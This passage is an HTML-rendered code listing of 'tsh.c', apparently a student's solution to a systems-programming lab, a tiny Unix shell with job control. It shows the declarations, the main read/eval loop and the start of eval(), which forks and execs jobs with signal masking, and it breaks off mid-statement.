class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJOBS      16   <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJID    1&lt;&lt;16   <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;      <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="keyword">char</span> prompt[] = <span class="string">&quot;tsh&gt; &quot;</span>;    <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="keyword">int</span> verbose = <span class="number">0</span>;            <span class="comment">/* if true, print additional output */</span></span><br><span class="line"><span class="keyword">int</span> nextjid = <span class="number">1</span>;            <span class="comment">/* next job ID to allocate */</span></span><br><span class="line"><span class="keyword">char</span> sbuf[MAXLINE];         <span class="comment">/* for composing sprintf messages */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> &#123;</span>              <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;              <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="keyword">int</span> jid;                <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="keyword">int</span> state;              <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];  <span class="comment">/* command line */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list */</span></span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we&#x27;ve provided for you */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Self-defining function */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">Fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">sigset_t</span>* oldset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigfillset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigaddset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sigdelset</span><span class="params">(<span class="keyword">sigset_t</span>* <span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell&#x27;s main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:             <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:             <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:             <span class="comment">/* don&#x27;t print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT, sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler);  <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read command line */</span></span><br><span class="line">        <span class="keyword">if</span> (emit_prompt) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">            app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span>* argv[MAXARGS];            <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];              <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg, state;                  <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;                      <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_one, mask_all, prev_one;</span><br><span class="line"></span><br><span class="line">    Sigemptyset(&amp;mask_one);</span><br><span class="line">    Sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)            <span class="comment">/* Ignore empty lines */</span></span><br><span class="line">        <span class="keyword">return</span>;     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;mask_one, &amp;prev_one);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;  <span class="comment">/* Child runs user job */</span></span><br><span class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">            setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) 